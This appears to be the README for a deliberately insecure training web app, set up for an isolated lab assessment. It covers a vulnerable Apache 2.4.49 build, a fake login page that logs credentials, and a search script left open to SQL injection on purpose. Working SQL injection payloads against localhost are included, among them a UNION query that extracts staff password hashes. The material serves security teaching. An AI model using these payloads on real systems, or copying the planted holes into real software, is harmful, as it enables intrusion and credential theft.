# VictimWeb

Themed target web app for an **isolated** cybersecurity lab assessment
(Greek mythology / "House of Hades"), served by Apache 2.4.49 compiled
from source at `/opt/apache-2.4.49` on an Ubuntu VM.

> WARNING: Apache 2.4.49 is vulnerable (CVE-2021-41773 / CVE-2021-42013).
> The admissions page below is intentionally vulnerable to SQL injection.
> Use only inside a host-only VM. Never expose it to the internet.

## Targets in this repo

| Page | Phase | What it demonstrates |
|---|---|---|
| `htdocs/login.html` + `cgi-bin/login.py` | 3 — False Messenger | Fake "Underworld Staff Portal" login; logs submitted attempts to `harvest.log` (credential-harvesting risk) |
| `cgi-bin/admissions.py` + `db/` | 2 — Admissions of the Damned | Public "Underworld Admissions Registry" search, **intentionally vulnerable to SQL injection** (error / boolean / UNION based) |

## Layout

```
htdocs/     -> /opt/apache-2.4.49/htdocs/     (static pages)
cgi-bin/    -> /opt/apache-2.4.49/cgi-bin/     (login.py, admissions.py)
db/         stays in the repo; run on the VM to build the PostgreSQL DB
deploy.sh   copies htdocs/ and cgi-bin/ into Apache and restarts
```

## Setup on the Ubuntu VM

```bash
cd ~
git clone https://github.com/USERNAME/VictimWeb.git
cd VictimWeb

# 1) Web files into Apache
sudo ./deploy.sh

# 2) PostgreSQL database for the SQLi target
sudo ./db/setup_db.sh
```

Requires `mod_cgid` loaded in `httpd.conf` (see the install notes).

## Database

- Engine: **PostgreSQL** (installed by `db/setup_db.sh`).
- DB `underworld`, app role `hades_app` / `styx` (over-privileged on purpose).
- Tables: `souls` (public records) and `wardens` (staff creds, reachable via UNION).
- Python driver: `python3-psycopg2` (installed by the setup script).

## SQL injection — quick checks

```bash
# baseline
curl "http://localhost/cgi-bin/admissions.py?q=sisyphus"

# always-true (returns all souls)
curl "http://localhost/cgi-bin/admissions.py?q=%25%27%20OR%20%271%27%3D%271"

# UNION: pull warden credentials through the 3-column result
#   ' UNION SELECT username, email, password_hash FROM wardens --
curl "http://localhost/cgi-bin/admissions.py?q=zzz%27%20UNION%20SELECT%20username%2Cemail%2Cpassword_hash%20FROM%20wardens--%20"
```

## Demo credentials (fake login)

`charon` / `ferryman` — themed demo, hardcoded in `cgi-bin/login.py`.

## Notes

- `harvest.log` is git-ignored (captured attempts stay local).
- Everything here is deliberately insecure training material for a
  controlled, offline lab assessment.
